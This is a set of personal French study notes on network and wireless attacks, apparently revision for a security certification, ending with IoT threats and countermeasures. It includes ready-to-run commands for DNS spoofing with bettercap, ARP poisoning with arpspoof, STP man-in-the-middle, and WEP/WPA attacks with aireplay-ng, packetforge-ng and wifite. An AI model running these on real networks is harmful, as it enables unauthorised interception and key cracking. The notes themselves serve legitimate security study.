- **DNS Hijacking :** L'attaquant modifie les paramètres DNS pour rediriger le trafic vers des serveurs DNS malveillants, pouvant conduire à des attaques de type man-in-the-middle.
    
    - Avec BetterCap :
        
        - - Dans mon exemple d'utilisation, j'aurai une vm et un hôte sur le même réseau.
			- Sur la machine attaquante (hôte dans mon cas) :
				- Lancer un server apache (ou un server malveillant, ce que tu peux quoi) :  
                    - sudo service apache2 start
                - Lancer dnsspoof dans bettercap :  
                    - bettercap
                    - set dns.spoof.domains site.quil.va.visiter
                    - set dns.spoof.all true
                    - dns.spoof on
                - Maintenant, quand la cible ira sur le site cible, il va tomber sur notre server comme par magie

    - Avec EtterCap :
        - Je crois que c'est bugué avec Ettercap en fait.

- **Clickjacking :** Une attaque où une page Web est superposée avec une autre, trompant l'utilisateur pour qu'il clique sur des éléments sans le savoir.
    
- **IP Hijacking :** Lorsqu'un attaquant prend le contrôle de l'adresse IP d'une machine, cela peut entraîner des conséquences graves, notamment la possibilité de rediriger le trafic destiné à cette adresse IP.
    
- **Browser Hijacking :** Des logiciels malveillants modifient les paramètres du navigateur Web d'un utilisateur, altérant la page d'accueil, les moteurs de recherche par défaut ou installant des extensions indésirables.
    
- **Wi-Fi Hijacking :** Un attaquant compromet une connexion Wi-Fi, permettant d'intercepter le trafic, d'effectuer des attaques au sein du réseau ou d'usurper l'identité d'un point d'accès légitime.
    
- **ARP Spoofing (ARP Hijacking) :** L'attaquant falsifie les tables ARP (Address Resolution Protocol) pour associer de fausses adresses IP à des adresses MAC, facilitant des attaques man-in-the-middle.
	- L'ARP spoofing c'est cool pour faire :  
		- Session Hijacking
		- Denial-of-Service Attack
	    - Man-in-the-Middle Attack :
		    - On peut le faire avec Ettercap :
			    - Rechercher les hôtes en ligne
			    - Nommer les deux targets cibles (routeur et la cible par exemple)
			    - Puis lancer l'attaque
			- Avec Arpspoof 
				- Dans mon exemple d'utilisation, on va compromettre la page arp entre le routeur wifi et une machine réseau (une vm dans mon cas)
				- Ce qu'il faut savoir quand on le fait sur une cible vm, c'est qu'il faut que la vm soit en mode promiscuité et que le type de réseau soit en bridge.
				- Activer l'ip forwarding sur la machine attaquante pour lui permettre de transferer des paquets entre différentes interfaces. (agir comme un pont en gros) :
					- `sudo echo 1 > /proc/sys/net/ipv4/ip_forward`
				- Lancer l'arp poisoning avec arpspoof :
					- `sudo arpspoof -i eth0 -t target_addr routeur_addr` Pour spécifier à la target que l'adresse du routeur combinera avec notre adresse mac.
					- `sudo arpspoof -i eth0 -t routeur_addr target_addr` Pour spécifier au routeur que l'adresse de la target correspond à notre adresse mac.
				- Normalement, si tu peux, quand tu fais un arp -a sur la machine cible, tu verras l'adresse du routeur qui va correspondre à l'adresse mac de la machine attaquante.
				- Pourquoi ca marche ? En fait quand on envoie des paquets, on regarde l'adresse mac sans se soucier de l'adresse ip. Donc la cible et le routeur envoie tout vers l'attaquant. La machine attaquante va donc regarder vers quelle adresse ip ce paquet était destiné et va donc air en conséquence en le gardant ou en le renvoyant.
				- Pour analyser le trafic, on peut donc utiliser wireshark.
				- Faut faire gaffe au Dynamic ARP Inspection (DAI).
		- Race Condition Request :
                    
		- Packet Sniffing
        - Data Interception
        - Connection Hijacking
        - VoIP tapping
        - Connection Resetting
        - Stealing Password

- -**SSL Stripping :** Un attaquant intercepte le trafic chiffré SSL/TLS, le déchiffre, puis le renvoie en clair, compromettant la confidentialité des données.
- **Session Token Hijacking :** Un attaquant vole ou intercepte les jetons d'authentification ou d'autorisation utilisés dans les applications Web, permettant une prise de contrôle de session.
    
- **Man-in-the-Middle Attacks :** Diverses formes d'attaques où un attaquant intercepte et manipule la communication entre deux parties sans leur consentement.
    
    - ARP Spoofing (voir un peu plus haut)
    - STP MitM :
        - Manuel :
            - Bon bah là faut un réseau avec plusieurs switch et STP enabled. Tu peux le voir en faisant brctl show.
            - On créer un bridge (switch virtuel) et pour chaque switch légitime qu'il y a, on créer une interface pour pouvoir intercepter le trafic entre le routeur et le switch :
                -  `brctl addbr bridge_name`
                - `brctl addif bridge_name eth1`
                - `brctl addif bridge_name eth2`
                - ...
            - On active STP et le Bridge :
                - `brctl stp bridge_name on`
                - `ifconfig bridge_name up`
            - Quand tu fais brctl showstp bridge_name, tu vois ton BID. On va le changer pour pouvoir passer en root bridge :
                - `brctl setbridgeprio bridge_name 5` Met ce que tu veux sur le 5 mais faut qu'il soit plus petit que celui du vrai switch root.
            - Quand tu refais `brctl showstp bridge_name`, tu vois le BID qui change et le designated root aussi et donc on a gagné le MitM. Y'a plus qu'à lancer wireshark.
        - Yersinia :
            - `sudo yersinia -G`
            - -> stp
            - -> launch attacks
            - -> Claiming Root Role (coche pas la case DoS enfin sauf si tu veux)
        - Ettercap :
            - Lance Ettercap, t'as même pas besoin de lancer un ARP Spoofing, tu lance juste le plugin stp_mangler
    - NDP MitM :
        - Étant donné que rien n'empêche qu'un attaquant d'essayer d'envoyer un Neighbor Advertisement plus rapidement que le routeur, l'attaque est faisable et simple.
        - On peut la faire manuellement assez simplement avec scapy mais ça prend de la place donc check : [https://packetlife.net/blog/2009/feb/2/ipv6-neighbor-spoofing/](https://packetlife.net/blog/2009/feb/2/ipv6-neighbor-spoofing/ "https://packetlife.net/blog/2009/feb/2/ipv6-neighbor-spoofing/")

_**Wireless Threats :**_

- [https://www.examcollection.com/certification-training/security-plus-wireless-attacks-and-their-types.html](https://www.examcollection.com/certification-training/security-plus-wireless-attacks-and-their-types.html "https://www.examcollection.com/certification-training/security-plus-wireless-attacks-and-their-types.html")
    
- **Access Control Attacks :**
    
    - **Spoofing MAC Address :**
    - **Rogue Access Point :**
    - **Misconfiguration :**
        - Ça peut être des trucs du genre des password simples, default credential, mauvaise stratégie en social engineering etc
- **Integrity Attacks :**
    
- - **Pense bête :**
	- Check si tu peux faire des injections avec aircrack-ng avant de te lancer sinon tu perd du temps :
		- aireplay-ng -9 wlan0mon

    - **WEP Injection :**
        
    - **Data Frame Injection :**
        
    - **Fake authentication :**
        
        - **WEP :**
            - C'est pour associer notre adresse MAC à l'AP et se faire donc passer pour un client légitime. C'est utile pour pas mal d'attaques.
            - Commandes avec aircrack-ng :
                - `aireplay-ng -1 0 -e bbox -a AP_MAC -h TON_ADDR_MAC wlan0mon`
                - ou
                - `aireplay-ng -1 6000 -o 1 -q 10 -e bbox -a AP_MAC -h TON_MAC wlan0mon`  6000 signifie se reauthentifier toute les 6000 secondes pour que les packets keep-alive (-q 10) soient envoyés (toute les 10 secondes). -o envoie qu'un seul packet à la fois, quand y'en a plusieurs, y'a des APs qui font chier.
            - Si l'attaque basique ne fonctionne pas, c'est probable que l'AP fonctionne sous shared-key authentication. Y'a quand même une méthode mais c'est plus chiant.
            - On peut le faire avec aircrack-ng :
                - `airmon-ng start wlan0 9` mode monitor sur le channel target 9 dans ce cas
                - `airodump-ng -c 9 --bssid AP_BSSID -w outputfile wlan0mon` Pour récupérer le fichier PRGA xor file c'est le handshake en fait
                - `aireplay-ng -0 1 -a AP_MAC -c TARGET_MAC wlan0mon` (dans un autre shell)   Pour déauthentifier une target et donc récupérer le handshaker nécessaire.
                - `aireplay-ng -1 0 -e bbox -y sharedkey.xor -a AP_MAC -h SOURCE_MAC wlan0mon`
    - **Replay Attacks :**
        
        - **Interactive packet replay (0841 attacks) :**
            - C'est une attaque excusive à WEP (y'a des variante pour WPA/WPA2). C'est pour rejouer un packet venant soit d'un fichier pcap soit directement d'un trafic capturé par ta carte. Le but est de rebroadcaster le packet injecté et de pouvoir générer un Initialization vector (IV). On va donc soit utilisé un packet naturellement fonctionnel ou manipuler un packet capturé.
            - Natural packets :
                - Pour créer packet naturel, les éléments à prendre en compte pour que le packet fonctionne :
                    - Il faut qu'il ait une destination avec une MAC address broadcast : FF:FF:FF:FF:FF:FF
                    - L'adresse de l'AP évidemment
                    - Ça doit être un packet qui vient d'un client wireless vers un wired network. C'est un paquet avec le bit "To DS" donc le bit 1.
                - Les commandes pour effectuer l'attaque avec aircrack-ng :
                    - `airodump-ng -c 6 -w out --bssid AP_MAC wlan0mon` pour chopper les réponses et voir si ça a fonctionnée.
                    - `aireplay-ng -2 -b AP_MAC -d FF:FF:FF:FF:FF:FF -t 1 wlan0mon`
                    - On va ensuite craquer les IV générés avec aircrack-ng quand on en a assez.
                    - `aircrack-ng wepcrack-01.pcap`
            - Manipulated packets :
                - Pour les packet capturés qu'on va manipuler à la volée :
                    - L'adresse de l'AP comme d'hab
                    - le packet "To DS" (à 1) pour qu'il aille vers un appareil connecté en ethernet donc "To Distribution System".
                - Les commandes avec aircrack-ng :
                    - `airodump-ng -c 6 -w out --bssid AP_MAC wlan0mon`
                    - `aireplay-ng -2 -b AP_MAC -t 1 -c FF:FF:FF:FF:FF:FF -p 0841 wlan0mon`
                    - ou alors
                    - `aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b AP_MAC -h SOURCE_MAC wlan0mon`
                    - Dans cette commande, l'adresse source doit être soit l'adresse d'un client wireless existant soit une adresse associé via une fake authentication faite auparavant.
        - **ARP Replay :**
            - WEP Attacks. C'est un peu comme la 0841 attack. On va faire générer à l'AP le même packet ARP sauf que ce sera un IV différent à chaque fois. On va donc pouvoir découvrir en craquant la WEP Key.
                - Commande :
                    - `aireplay-ng -3 -b AP_MAC -h SOURCE_MAC wlan0mon` Avec encore la source mac d'un client associé ou provenent d'une fake authentication.
                    - Tu peux au cas où lancer un airodump-ng pour capturer les IVs mais je sais pas si c'est obligatoire.
                    - `aireplay-ng -3 -b 00:13:10:30:24:9C -h 00:11:22:33:44:55 -r replay_arp-0219-115508.cap wlan0mon` Pour rejouer avec un fichier d'ouput d'une précédente ARP replay je crois. Si j'ai bien compris, c'est pour continuer l'attaque quoi.
        - **KRACK Attacks :**
            - Reviens dessus quand tu aura + de connaissance en réseau. [https://github.com/Hackndo/krack-poc](https://github.com/Hackndo/krack-poc "https://github.com/Hackndo/krack-poc") [https://beta.hackndo.com/krack/](https://beta.hackndo.com/krack/ "https://beta.hackndo.com/krack/")
            - Vulnerabilite sur WPA2. Le 4-way handshaking sert a prouver que l'AP et le client connaissent le PSK/PMK sans avoir besoin de l'envoyer. Le 4-way hs genere une autre cle appele PTK (Pairwise Transient Key). Elle est genere grace a la concatenation du PMK, Anonce, Snonce, AP MAC address et Client MAC address. Ensuite, on le fout dans une fonction pseudo random. Il existe aussi une GTK pour decrypter le trafic multicast et broadcast.
            - Le 4-way handshaking :
                - L'AP envoie un Anonce pour donner les attribut au client pour lui permettre de creer la PTK.
                - Le client envoie un Snonce a l'AP avec un MIC.
                - L'AP construit et envoie un GTK avec un nouveau MIC.
                - Le client envoie une confirmation ACK.
    - La vulnerabilités :
        
    - **KoreK Chopchop :**
        
        - Attaque pour révéler le plaintext d'un paquet, pas pour révéler la WEP Key. C'est également possible sous certaine conditions WPA mais à voir.
            
        - Théorie compressée :
            
            - - A 802.11 WEP frame consists of many fields: headers, data, ICV, etc. Let's consider only data and ICV, and assume a constant [IV](http://en.wikipedia.org/wiki/Initialisation_vector "http://en.wikipedia.org/wiki/Initialisation_vector").  
                    - [ICV](http://en.wikipedia.org/wiki/ICV_-_Integrity_Check_Value "http://en.wikipedia.org/wiki/ICV_-_Integrity_Check_Value") algorithm is an implementation of [CRC32](http://en.wikipedia.org/wiki/Cyclic_redundancy_check "http://en.wikipedia.org/wiki/Cyclic_redundancy_check"). It is calculated incrementally for every byte of data the frame has. Each step in C:
						- crc = crc_tbl\[(crc ^ data\[i\]) & 0xFF\] ^ ( crc >> 8 );
                        - ICV is stored little-endian and frame is xor'red with RC4 keystream. From now on, we'll represent XOR operation with \`+'.
                        - Frame 1:
	                        - \__ DATA _ \_ICV _ D0 D1 D2 D3 D4 I3 I2 I1 I0 + + + + + + + + + K0 K1 K2 K3 K4 K5 K6 K7 K8 = = = = = = = = = R0 R1 R2 R3 R4 R5 R6 R7 R8
                        - Where D is data, I is ICV, K is keystream and R is what you get. If we add a data byte we get Frame 2:
	                         - \__ DATA \___ \_ICV  D0 D1 D2 D3 D4 D5 J3 J2 J1 J0 + + + + + + + + + + K0 K1 K2 K3 K4 K5 K6 K7 K8 K9 = = = = = = = = = = S0 S1 S2 S3 S4 S5 S6 S7 S8 S9
                         - Where J is ICV and S is what you get.
                        - It is possible to go from Frame 2 to Frame 1 just by guessing the value of the sum I3+D5, that we will call X (one of 256 chances). X=I3+D5
                        - D0 to D4 remain the same.
                        - R5 = I3 + K5 = I3 + (D5+D5) + K5 = (I3+D5) + (D5+K5) = X + S5.
                         - R6 to R8 are computed by reversing one crc step based on the value of X. There's a correspondence among I2-I0 and J3-J1 because crc shifts them back but D5 “pushes” them forward again. They are not necessarily keeping the same values, but their difference depends only on X, which we have guessed.
                         - J0 depends only on X. K9 = S9 + J0. We have guessed the last message byte and the last byte of keystream.
                         - We will guess X by trial and error. The access point must discard invalid frames and *help us* in guessing the value of X.
                         - By doing this, we have found a valid frame 1 byte shorter than original one, and we have guessed one byte of keystream. This process can be induced to get the whole keystream.

        - On va donc chercher des paquets les plus petits possibles car c'est plus facile pour la déduction du plaintext.
            
        - Commandes :
            
            - `aireplay-ng -4 -h MAC_SOURCE -b AP_MAC wlan0mon` Comme d'hab, la mac source c'est soit celle d'un client associé, soit une fake authentication.
            - Si jamais t'as la flemme de faire une fake authentication, y'a une autre méthode qui fonctionnent sur les AP vulnérable. En gros pour l'adresse source, ca sera une adresse random. Si jamais l'AP envoie un packet deauth, c'est que le packet source est valide. Et si il est valide, c'est qu'un byte a donc été déterminé :
            - `aireplay-ng -4 -b AP_MAC wlan0mon`
            - Après avoir trouvé la keystream, on peut l'utiliser pour créer des paquets tel que des packets ARP :
            - `aireplay-ng -4 -h SOURCE_MAC wlan0mon` On décrypte d'abord un packet
            - `tcpdump -s 0 -n -e -r replay_dec.cap`Pour récupérer une adresse ip
            - `packetforge-ng -0 -a AP_MAC -h SOURCE_MAC -k DEST_IP -l SOURCE_IP -y replay_dec.xor -w arp.cap` Où l'ip dest c'est l'ip qu'on a trouvé juste avant, l'ip source on s'en fout tu met ce que tu veux, le fichier xor c'est le fichier avec la keystream et arp.cap c'est l'output
            - `aireplay-ng -2 -r arp.cap wlan0mon` Pour replay
    - **Fragmentation Attacks :**
        
        - WEP :
            - C'est une autre technique qui peut obtenir 1500 bytes de PRGA (partie de RC4 qui génère la keystream). Et donc comme KoreK chopchop, on peut générer des paquets en dépit d'avoir la clé wep. Pour le fonctionnement un peu plus détaillé : [Final-Nail-in-WEPs-Coffin.slides.pdf](file:///home/wpkaliuser/.config/joplin-desktop/resources/38973ef6b8c24ffda1025635a682cfbc.pdf "file:///home/wpkaliuser/.config/joplin-desktop/resources/38973ef6b8c24ffda1025635a682cfbc.pdf")
            - Commandes :
                - `aireplay-ng -5 -b AP_MAC -h SOURCE_MAC wlan0mon`
                - On obtient la keystream qu'on pourra utiliser avec packetforge-ng pour générer des packets comme pour la KoveK chopchop :
                - `packetforge-ng -0 -a AP_MAC -h SOURCE_MAC -k DEST_IP -l SOURCE_IP -y replay_dec.cap -w arp.cap`
                - Cette attaque envoie beaucoup de packet et aucun ne doit être perdu pour que ca marche. Y'a pas mal d'info et de tuto sur cette attaque là bas je crois [https://www.aircrack-ng.org/doku.php?id=tutorial](https://www.aircrack-ng.org/doku.php?id=tutorial "https://www.aircrack-ng.org/doku.php?id=tutorial") Pour la séléction de paquets au début, faut s'adapter donc si tu vois un paquet chiant qui marche pas, tu le reprend pas gros con.
        - WPA/WPA2/WPA3 :
            - Fragattack
    - **Cafe latte Attacks :**
        
        - [http://www.esecurityplanet.com/trends](http://www.esecurityplanet.com/trends%20/article.php/3716656/The-Caffe-Latte-Attack-How-It-Worksand-How-to-Block-It.htm "http://www.esecurityplanet.com/trends%20/article.php/3716656/The-Caffe-Latte-Attack-How-It-Worksand-How-to-Block-It.htm")  
            [/article.php/3716656/The-Caffe-Latte-Attack-How-It-Worksand-How-to-Block-It.htm](http://www.esecurityplanet.com/trends%20/article.php/3716656/The-Caffe-Latte-Attack-How-It-Worksand-How-to-Block-It.htm "http://www.esecurityplanet.com/trends%20/article.php/3716656/The-Caffe-Latte-Attack-How-It-Worksand-How-to-Block-It.htm")
            
        - On capture un ARP Packet d'un client, on le manipule, on le renvoie au client. Lui aussi regénère des packet qu'on peut capturer avec airodump-ng. On pourra donc utiliser aircrack-ng pour determiner la clé WEP.
            
        - `aireplay-ng -6 -h SOURCE_MAC -b AP_MAC -D wlan0mon` -D c'est pour désactiver l'AP Detection
            
    - **Hirte Attacks :**
        
        - C'est une variante du cafe latte où c'est pas seulement des packet ARP qui sont utilisés. On a soit besoin d'un packet IP ou ARP venant du client. Après, on manipule l'header en mettant l'adresse du client en position de destinataire pour lui renvoyer. Il va donc lui aussi nous renvoyer un packet et quand on en aura assez, on pourra craquer la WEP Key.
        - Commandes :
            - `aireplay-ng -7 -h TON_ADDR_MAC -D wlan0mon`
        - Ça marche aussi en se faisant passer pour un AP :
            - `airbase-ng -c channel -e bbox`
            - `airodump-ng -c 6 wlan0mon` (dans un autre shell)
    - **WPA Migration Mode Attacks :**
        
        - Le WPA Migration Mode c'est un mode qui permet à des clients WEP et WPA de se connecter au même AP.
        - Comme le caffe latte attack, on attend un packet ARP de l'AP, on le manipule et on le renvoie à l'AP. Il va donc générer à l'infini des packets ARP avec des nouveaux IVs à chaque fois. On pourra donc craquer avec aircrack-ng la clé WEP avec les paquets ARP :
            - Faire une fake authentication.
            - `aireplay-ng -8 -b MAC_AP -h SOURCE_MAC wlan0mon`Ça va attendre pour un packet ARP de l'AP et dès qu'il en a un, il va le bitflip et le réinjecter direct vers l'AP -> réponse de l'AP -> génération infinie
            - `aircrack-ng -a 1 -b BSSID output*.cap` output*.cap signifie qu'il prend tous les fichiers qui commence par output et finissent par .cap. Il les utilise pour casser la WEP Key (spécifié par -a 1)
- **Bit Flipping :**
    
- **FMS Attacks :**
    
    - **WEP Only.**
- **PTW Attacks :**
    
    - **WEP Only.**
- **Coolface Attacks :**
    
    - **WEP Only.**
- **Ohigashi-Morii Attack :**
    
    - **WPA**
- **WPS Pixie Dust Attacks :**
    
    - ![https://blog.hackenproof.com/wp-content/uploads/2022/10/WPS-PIN-External-Registrar-Protocol1-1.webp](file:///home/wpkaliuser/.config/joplin-desktop/resources/d6e0380faa234b65b84fb1a11097426b.webp)
    - Il faut que l'attaquant intercepte la connexion d'un client vers un réseau WPS. On va chopper des infos dont un code PIN que le routeur génere. Avec ça, on pourra calculer la clé de session secrète.
        
    - On peut le faire avec wifite :
        
        - `sudo wifite --kill`Se mettre en mode monitor et lancer wifite. On va ensuite repérer notre cible et voir si elle utilise WPS
        - Faire Ctrl + C pour stoper la recon puis séléctionner la cible et le tour est joué, wifite va automatiquement faire les attaques.
- **KCK Attacks :**
    
- **Hole196 :**
    
    - Dans WPA/WPA2, tous les utilisateurs d'un réseau peuvent communiquer en broadcast avec la même GTK. Et rien n'empêche le spoofing avec ces packets donc on peut lancer (si on est authentifier sur le réseau) des packets avec la GTK mais à une adresse MAC target à la place de l'adresse broadcast. Et on met l'adresse IP du routeur en source. La target va donc mettre son ARP table à jour avec l'adresse MAC attaquante et l'adresse IP routeur et on aura donc un MitM.
- **Confidentiality Attacks :**
    
    - C'est en passant par l'interception d'information sensibles.
    - **Analyse de trafic :**
        - **Capture de WPA/WPA2 Handshake :**
            - On peut utiliser airbase-ng :
                - `airbase-ng -c channel -e bbox -z 2 -W 1 cfrag wlan0mon` Pour WPA TKIP spécifié par -z 2
                - `airbase-ng -c channel -e bbox -Z 4 -W 1cfrag wlan0mon`  Pour WPA2 CCMP. Le -W 1 c'est parce que des fois des clients peuvent être confus.
    - **Session Hijacking :**
    - **Masquerading :**
    - **Cracking :**
- **Ad Hoc Connection Attacks :**
    
    - [https://www.examcollection.com/certification-training/security-plus-wireless-attacks-and-their-types.html](https://www.examcollection.com/certification-training/security-plus-wireless-attacks-and-their-types.html "https://www.examcollection.com/certification-training/security-plus-wireless-attacks-and-their-types.html")
    - Interéssant comme concept
- **Jamming Signal Attacks :**
    
- **Méthodologie :**
    
    - **Wi-Fi Discovery :**
        - **Passive Footprinting :**
            - C'est passive donc on se connecte pas, on envoie pas de requêtes, on est juste présent.
            - Donc ça peut passer par le sniffing, la détection de network au alentours ou autre.
            - **Tools :**
                - Airwaves
                - Kismet
                - Netsurveyor
                - WiGLE pour une map de tout les AP
        - **Active Footprinting :**
            - Pour l'acquisition d'information, on peut (doit) envoyer une requête de connexion à l'AP pour extraire des trucs sympa et comprendre/deviner la méthode d'authentication.
    - **Wireless Traffic Analysis :**
        - Là c'est la vraie analyse du trafic donc on peut essayer de chopper des infos du genre SSID, Authentication methodes, techniques d'encryption etc.
        - **Tools :**
            - Wireshark
            - Omni Peek
            - Commview
    - **Lancement de l'attaque Wireless :**
        - Bah c'est l'exploitation de vulnérabilité.
        - **Tools :**
            - Aircrack-ng
- **Bluetooth Attacks :**
    
    - **Bon à savoir :**
        - 2.4 GHz / jusqu'à 10 mètres
    - **BlueSmacking :**
        - C'est un DoS mais sur un appareil connecté en bluetooth. On peut utiliser un ping of death par exemple.
    - **BlueBugging :**
        - C'est l'exploitation de vulnérabilité sur l'appareil bluetooth pour prendre contrôle, tracker ou écouter le trafic de la victime.
    - **BlueJacking :**
        - C'est un envoie de message à des appareils connecté en bluetooth. On peut envoyer des messages, des images ou autre fichier.
    - **BluePrinting :**
        - C'est l'extraction de données d'un appareil comme le firmware, le modèle, le numéro de série ou autre.
- **Defense :**
    
    - **WIPS : **
        - C'est un dispositive qui doit être connecté au réseau et qui détecte les activités malveillante.
        - Il peut par exemple faire du monitoring sur les spectre radio, détecte les rogues access points, detecte les MAC spoofing. Il va donc faire chier pas mal d'attaques comme les Rogue AP, MITM, Ad Hoc attacks, Honeypots ou encore les DoS.
        - C'est composé de trois élément :
            - Le server
            - Le sensor
            - La console
    - **Tools de sécurité :**
        - AirMagnet WIFI Analyzer
        - Motorola's AirDefense Services Platform (ADSP)
        - Cisco Adaptive Wireless IPS
        - Aruba RFProtect

_**IoT (Internet of Things) :**_

- ![image.png](file:///home/wpkaliuser/.config/joplin-desktop/resources/21b37cd9c07e4aa6a2d32ff826ded3e2.png)
- **Modèles de communications IoT :**
    - **Device-to-device :**
        - Deux appareils sont connectés entre eux sans intermédiaire. Un téléphone et une imprimante connecté par exemple.
    - **Device-to-Cloud :**
        - C'est un type de communication dans lequel tous les appareils connecté entre eux vont passer par l'application server qui est hosté en local ou en cloud.
    - **Device-to-Gateway :**
        - C'est comme le Device-to-Cloud sauf qu'on ajoute une gateway par laquel tous va passer. La gateway sert à connecter les appareils à internet, apporter une couche de sécurité puisqu'on peut inspecter et contrôler les paquets.
    - **Back-End Data-Sharing :**

![image.png](file:///home/wpkaliuser/.config/joplin-desktop/resources/4935bab13f1ad594a0bce4e6250f7a73.png)

- **Vulnérabilité IoT principales :**
    
    - Manque de sécurité
    - Interface vulnérables
    - Risque physique
    - Difficulté d'update le firmware et l'OS
    - Problème d'interopérabilité
    - ![image.png](file:///home/wpkaliuser/.config/joplin-desktop/resources/1e5c8ba97aa4078bfe60dc83017fa9de.png)
- **Les angles d'attaques :**
    
    - Device memory containing credentials.
    - Access Control.
    - Firmware Extraction.
    - Privileges Escalation.
    - Resetting to an insecure state.
    - Removal of storage media.
    - Web Attacks.
    - Firmware Attacks.
    - Network Services Attacks.
    - Unencrypted Local Data Storage.
    - Confidentiality and Integrity issues.
    - Cloud Computing Attacks.
    - Malicious updates.
    - Insecure APIs.
    - Mobile Application threats.
- **Attaques IoT :**
    
    - **DDoS Attacks :**
    - **Rolling Code Attacks :**
        - On capture le signal émit et on le bloque au récépteur légitime. Par exemple, si quelqu'un envoit un signal pour débloquer sa bagnole, nous on peut l'intercepter. La bagnole ne sera pas ouverte mais on aura capturé le signal pour le réutiliser. Ça marche aussi pour bloquer une voiture à se fermer, on capture le signal donc elle le reçoit pas et la voiture est toujours ouverte.
    - **BlueBorne Attacks :**
    - **Jamming Attacks :**
        - Priver les appareils de se parler entre eux en gros.
    - **Backdoor :**
        - Ça peut inclure :
            - Eavesdropping
            - Sybil Attack
            - Exploit Kits
            - Man-in-the-Middle Attack
            - Replay Attack
            - Forged Malicious Devices
            - Side Channel Attack
            - Ransomware Attack
- **Tools :**
    
    - OWASP IoT Project (jsp)
    - IoT Inspector
    - Foren6
    - RFCrack
    - Attify Zigbee Framework
    - HackRF One
- **Contre-mesures :**
    
    - Firmware update
    - Block unnecessary ports
    - Disable Telnet
    - Use encrypted communication such as SSL/TLS
    - Use strong password
    - Use encryption of drives
    - User account lockout
    - Periodic assessment of devices
    - Secure password recovery
    - Two-Factor Authentication
    - Disable UPnP
